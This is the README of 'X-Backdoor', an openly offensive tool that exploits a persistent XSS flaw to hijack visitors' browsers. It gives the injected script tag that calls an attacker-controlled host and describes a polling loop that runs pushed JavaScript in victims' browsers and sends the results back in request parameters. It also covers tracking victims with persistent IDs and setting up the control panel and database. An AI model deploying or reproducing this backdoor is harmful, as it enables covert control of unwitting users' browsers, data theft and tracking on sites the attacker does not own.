# X-Backdoor I

X-Backdoor is a tool to take advantage of a persistent XSS vulnerability. The idea is to play and explore the modern browsers capabilities and the impact that these can have when someone can control the clients.

### Version
1.0

### Screenshots
![screen1](https://raw.githubusercontent.com/BlackEmpire/xbackdoor/master/screenshots/screen1.png "Screen 1")
![screen2](https://raw.githubusercontent.com/BlackEmpire/xbackdoor/master/screenshots/screen2.png "Screen 2")

### Description
We have a target site and an attacker site. In the attacker site there are all the files of the project:
* db.php - Contains the database configuration
* getjs.php - Send js code to the client
* acp/ - contain all the files to admin the backdoor

Now, the attacker inject (with a persistent XSS) this piece of code in the target site:
```html
<script id="scr72" src="http://attackersite/getjs.php"></script>
```
So when a client visit the target site its browser will fetch the content from getjs.php. The javascript code sent from getjs.php, force the browser to make a new request every X seconds, where X is in your configuration. Meanwhile the attacker can view the victim clients, send to them javascript functions and get the response. When a client request the code from getjs.php, the php script checks if there is some js function to execute. If there is, it'll be sent to the client. The next time the client perform a request to the attacker site (looking for new commands) it'll send also the response of the previous function/command.

#### Reload mechanism
In the javascript code sent from the attacker site there is a function that re-create a new script object in the DOM and this force the browser to make a new request. Every time the new script object has two get parameters. The first is the user id (uid) and the second is the data as response from a previous command. So it looks like this:
```html
<script id="scr72" src="http://attackersite/getjs.php?r=2366&uid=7278&data=somereply"></script>
```
The parameter r is a random number to avoid the caching (the requested url are always different).By default the response sent with the parameter data is encoded, while the javascript code sent from the php script is in clear text.

### User ID
When a client visit the infected page on the target site for the first time, a random number (his uid) will be generated and he'll send a special message to the attacker php script.
The uid will be saved into localStorage and in a cookie, so the browser will remember its uid. The attacker have to send a code to delete the cookie and clear the localStorage to have a new registration by the same user.

#### Database
The database has three tables: `functions`, `users`, `schedules`.\
The table `users` contains all information about the clients retrieved by php (server side).\
The table `functions` contains a list of javascript functions.\
The table `schedules` points one ore more functions that a certain client have to execute and saves the response.

The database schema is in db_dump.sql, you can manually execute the queries or import the file with phpMyAdmin. In the database there are already some functions. See *funclib.md* to get more functions.
### Configuration
Edit the following files:
* acp/login.php - Edit the default login password
* db.php - Insert your database configuration
* getjs.php - Set some parameters

### Development

Everyone can join the project and submit his patches :)


License
----

GNU General Public License v3 (GPL-3)


